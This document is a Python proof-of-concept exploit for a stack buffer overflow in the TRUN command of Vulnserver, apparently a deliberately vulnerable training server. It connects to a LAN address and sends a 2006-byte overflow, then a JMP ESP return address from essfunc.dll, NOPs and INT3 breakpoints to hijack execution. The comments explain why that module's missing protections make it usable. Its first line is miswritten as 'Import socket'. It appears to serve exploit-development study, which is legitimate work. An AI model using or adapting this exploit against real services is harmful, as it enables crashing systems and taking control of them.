Import socket

# Define the target server IP and Port

target_ip = '192.168.1.136'
target_port = 9999

# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
eip_overwrite = b'\xAF\x11\x50\x62'

# Add a sequence of NOPs (0x90) followed by three INT3 (0xCC) breakpoints to help with debugging.
nops_and_breakpoint = b'\x90' * 10 + b'\xCC' * 3

# Offset is 2006. We are sending 2006 'A's followed by the address 0x625011AF, some NOPs, and breakpoints for debugging.
buffer = b'A' * 2006 + eip_overwrite + nops_and_breakpoint

# Command
command = b'TRUN'
command_magic = b' .'

try:
        # Create a socket object and connect to the server
        print('Exploit> Connect to target')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Receive the banner or welcome message from the server
        banner = s.recv(1024).decode('utf-8')
        print(f'Server> {banner}')

        # JMP ESP
        print('Exploit> Jump to ESP register')
        jmp_esp = command + command_magic + buffer
        s.send(jmp_esp)

        # Receive the response
        print('Exploit> The target server is expected to crash. No response will be received.')
        try:
                response = s.recv(1024).decode('utf-8')
                print(f'Server> {response}')
        except Exception as e:
                print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
        # Exception handling
        print(f'An error occurred: {str(e)}')

finally:
        # Close the connection
        s.close()
